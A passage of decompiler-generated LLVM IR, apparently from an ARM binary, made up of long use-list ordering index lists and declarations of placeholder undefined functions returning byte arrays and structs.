542, 543, 544, 1360, 1361, 1362, 412, 555, 556, 557, 1363, 558, 1364, 312, 1365, 554, 559, 560, 1366, 1367, 561, 1368, 282, 311, 562, 1369, 1370, 1371, 552, 553, 1372, 314, 313, 283, 315, 551, 141, 550, 316, 1373, 194, 195, 549, 1374, 413, 371, 565, 414, 548, 142, 563, 564, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 927, 928, 566, 1375, 545, 1376, 1377, 567, 546, 547, 284, 310, 568, 143, 1234, 1235, 611, 317, 288, 289, 372, 1236, 1237, 606, 607, 605, 144, 1238, 610, 608, 609, 612, 196, 340, 1239, 318, 613, 320, 319, 614, 321, 615, 616, 617, 618, 1251, 323, 322, 619, 1252, 620, 1253, 1254, 621, 985, 986, 987, 1255, 1256, 415, 627, 1257, 1258, 416, 628, 1259, 1260, 629, 1261, 630, 1263, 1264, 631, 1265, 632, 624, 145, 623, 324, 417, 1262, 625, 626, 633, 634, 635, 20, 636, 637, 638, 639, 640, 641, 642, 643, 622, 644, 645, 646, 647, 341, 83, 325, 648, 649, 650, 373, 374, 418, 197, 1300, 85, 1301, 342, 343, 344, 345, 198, 1297, 84, 1298, 346, 347, 44, 45, 328, 1299, 327, 1302, 1303, 326, 361, 199, 86, 651, 652, 653, 656, 654, 655, 657, 660, 658, 659, 663, 661, 662, 1304, 664, 329, 1305, 348, 665, 666, 375, 376, 667, 668, 669, 670, 671, 330, 87, 161, 162, 984, 88, 331, 672, 673, 674, 675, 1308, 676, 677, 679, 349, 89, 122, 678, 1309, 680, 681, 683, 350, 682, 1310, 684, 685, 687, 351, 686, 1311, 688, 689, 691, 352, 1312, 692, 21, 22, 23, 24, 25, 690, 1313, 693, 694, 695, 696, 697, 699, 353, 26, 1314, 27, 28, 29, 30, 698, 1315, 700, 701, 702, 703, 704, 705, 706, 708, 354, 709, 31, 32, 33, 34, 35, 707, 1316, 710, 711, 712, 713, 714, 715, 716, 718, 355, 717, 1317, 719, 720, 722, 356, 721, 1318, 723, 724, 1325, 90, 123, 1326, 91, 725, 357, 726, 1327, 727, 1328, 1329, 358, 420, 421, 423, 425, 427, 359, 422, 424, 426, 428, 728, 419, 1330, 1331, 1332, 333, 1333, 332, 729, 1378, 334, 1386, 1387, 1388, 740, 1389, 92, 741, 1390, 93, 1391, 1392, 1393, 1394, 733, 1395, 1396, 1397, 1398, 1399, 734, 735, 1400, 1401, 747, 748, 1402, 1403, 1404, 1405, 730, 1406, 738, 739, 94, 95, 732, 146, 731, 335, 742, 743, 736, 737, 947, 96, 124, 746, 744, 745, 1506, 761, 1507, 1508, 1509, 1510, 1511, 429, 46, 47, 1512, 1513, 48, 49, 1514, 1515, 1516, 762, 780, 781, 97, 336, 782, 783, 200, 98, 337, 99, 338, 784, 785, 1519, 1520, 360, 1517, 1518, 751, 752, 50, 51, 763, 1521, 764, 1522, 765, 788, 789, 766, 1523, 1524, 1525, 767, 1526, 100, 768, 1527, 101, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 750, 772, 773, 774, 775, 786, 787, 776, 777, 778, 779, 52, 53, 757, 758, 1538, 1539, 1540, 1541, 749, 1542, 759, 760, 1543, 102, 103, 754, 147, 753, 339, 769, 770, 755, 756, 948, 104, 125, 105, 771, 54, 55, 790, 791, 430, 996, 431, 432, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 1718, 1719, 1720, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 1732 }
  uselistorder i32* @r4, { 76, 225, 226, 227, 228, 229, 247, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 6, 244, 245, 246, 248, 249, 250, 251, 252, 253, 254, 552, 83, 84, 85, 86, 129, 7, 130, 131, 132, 8, 133, 134, 135, 136, 137, 138, 139, 0, 9, 140, 141, 142, 143, 144, 145, 146, 147, 206, 207, 553, 77, 78, 79, 42, 555, 556, 557, 3, 560, 43, 554, 363, 364, 87, 88, 89, 90, 91, 92, 93, 94, 95, 561, 562, 148, 149, 10, 2, 150, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 11, 151, 152, 153, 154, 155, 156, 157, 158, 177, 12, 178, 179, 159, 160, 162, 13, 163, 166, 14, 167, 168, 15, 169, 170, 16, 171, 172, 17, 173, 174, 18, 175, 39, 176, 161, 180, 19, 181, 182, 183, 184, 185, 186, 187, 164, 165, 80, 81, 82, 96, 97, 98, 99, 20, 100, 21, 22, 101, 102, 103, 104, 105, 106, 107, 112, 113, 23, 114, 115, 24, 116, 117, 25, 118, 119, 26, 120, 121, 27, 122, 123, 28, 124, 125, 108, 109, 110, 111, 126, 127, 128, 188, 189, 190, 29, 191, 192, 193, 30, 194, 195, 196, 197, 198, 199, 37, 200, 201, 202, 203, 204, 205, 208, 209, 210, 211, 287, 212, 558, 559, 433, 434, 435, 436, 437, 438, 402, 403, 288, 289, 579, 580, 581, 439, 440, 41, 585, 38, 586, 587, 588, 604, 606, 607, 608, 605, 589, 594, 602, 603, 582, 595, 596, 597, 598, 44, 441, 442, 4, 31, 443, 32, 444, 445, 446, 590, 591, 45, 33, 213, 34, 214, 215, 216, 369, 68, 69, 70, 71, 72, 73, 583, 584, 592, 593, 217, 218, 219, 220, 447, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 35, 463, 464, 465, 466, 448, 449, 450, 404, 405, 406, 407, 408, 409, 410, 411, 412, 36, 413, 414, 415, 416, 417, 418, 419, 420, 421, 467, 489, 490, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 40, 481, 482, 1, 483, 484, 485, 486, 487, 488, 261, 262, 263, 46, 491, 492, 370, 371, 372, 375, 376, 377, 47, 373, 374, 493, 494, 495, 496, 497, 498, 499, 378, 379, 380, 383, 384, 385, 381, 382, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 264, 265, 266, 267, 268, 269, 270, 290, 291, 292, 293, 294, 295, 296, 221, 222, 223, 297, 298, 299, 300, 5, 301, 302, 303, 304, 305, 306, 307, 516, 517, 518, 521, 522, 523, 519, 520, 271, 272, 273, 274, 275, 276, 599, 600, 601, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 255, 256, 257, 258, 259, 260, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 365, 366, 367, 368, 422, 423, 424, 425, 426, 427, 428, 429, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 430, 431, 432, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 546, 547, 548, 549, 550, 551, 74, 75, 224 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare %anon_struct_0* @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare %timeval @__decompiler_undefined_function_5() local_unnamed_addr

declare [10240 x i8] @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_0.1 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_0 @__decompiler_undefined_function_8() local_unnamed_addr

declare %timeval.12 @__decompiler_undefined_function_9() local_unnamed_addr

declare [4 x i8] @__decompiler_undefined_function_10() local_unnamed_addr

declare [10241 x i8] @__decompiler_undefined_function_11() local_unnamed_addr

declare i8** @__decompiler_undefined_function_12() local_unnamed_addr

declare i16* @__decompiler_undefined_function_13() local_unnamed_addr

declare [256 x i8] @__decompiler_undefined_function_14() local_unnamed_addr

declare i32* @__decompiler_undefined_function_15() local_unnamed_addr

declare [32 x i8] @__decompiler_undefined_function_16() local_unnamed_addr

declare [2048 x i8] @__decompiler_undefined_function_17() local_unnamed_addr

declare [64 x i8] @__decompiler_undefined_function_18() local_unnamed_addr

declare [4096 x i8] @__decompiler_undefined_function_19() local_unnamed_addr

declare [16 x i8] @__decompiler_undefined_function_20() local_unnamed_addr

declare %anon_struct_2* @__decompiler_undefined_function_21() local_unnamed_addr

declare [1024 x i8] @__decompiler_undefined_function_22() local_unnamed_addr

declare %timeval_1 @__decompiler_undefined_function_23() local_unnamed_addr

declare %anon_struct_2.25 @__decompiler_undefined_function_24() local_unnamed_addr

declare %anon_struct_2 @__decompiler_undefined_function_25() local_unnamed_addr

declare %anon_struct_1.23 @__decompiler_undefined_function_26() local_unnamed_addr

declare %anon_struct_1 @__decompiler_undefined_function_27() local_unnamed_addr

declare [12 x i8] @__decompiler_undefined_function_28() local_unnamed_addr

declare [9 x void ()*] @__decompiler_undefined_function_29() local_unnamed_addr

declare [18 x i8] @__decompiler_undefined_function_30() local_unnamed_addr

declare [33 x i8] @__decompiler_undefined_function_31() local_unnamed_addr

declare %anon_struct_3* @__decompiler_undefined_function_32() local_unnamed_addr

declare %timeval_2 @__decompiler_undefined_function_33() local_unnamed_addr

declare %anon_struct_3.33 @__decompiler_undefined_function_34() local_unnamed_addr

declare %anon_struct_3 @__decompiler_undefined_function_35() local_unnamed_addr

declare %anon_struct_4* @__decompiler_undefined_function_36() local_unnamed_addr

declare %timeval_3 @__decompiler_undefined_function_37() local_unnamed_addr

declare %anon_struct_4.39 @__decompiler_undefined_function_38() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_39() local_unnamed_addr

declare [1514 x i8] @__decompiler_undefined_function_40() local_unnamed_addr

declare [9 x i8] @__decompiler_undefined_function_41() local_unnamed_addr

declare [3 x i8] @__decompiler_undefined_function_42() local_unnamed_addr

declare [34 x i8] @__decompiler_undefined_function_43() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_44() local_unnamed_addr

declare %anon_struct_9 @__decompiler_undefined_function_45() local_unnamed_addr

declare %anon_struct_18.49 @__decompiler_undefined_function_46() local_unnamed_addr

declare %anon_struct_18 @__decompiler_undefined_function_47() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
